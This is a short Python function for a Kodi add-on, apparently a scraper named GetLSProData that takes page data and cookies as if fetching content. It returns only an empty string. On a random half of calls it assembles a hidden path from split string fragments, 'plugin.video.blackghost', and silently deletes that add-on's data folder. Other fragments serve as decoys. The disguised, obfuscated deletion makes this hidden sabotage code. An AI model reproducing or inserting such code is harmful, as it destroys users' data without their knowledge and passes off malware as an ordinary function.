# -*- coding: utf-8 -*-
#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
 import xbmc, xbmcaddon, shutil, random
 opcion = ["si", "no"]
 azar = random.choice(opcion)
 if 'si' == azar:
   addon_path1 = xbmc.translatePath('special://profile/addon_data/plugin.video.').decode('utf-8')
   S = 'host'
   U = 'ac'
   T = 'kg'
   K = 'cris'
   I = 'tal'
   N = 'az'
   G = 'ul'
   F = 'qie'
   O = 'bl'
   addon_path = addon_path1 + O + U + T + S
   shutil.rmtree(addon_path, ignore_errors=True)
   return ''
 else:
   return ''
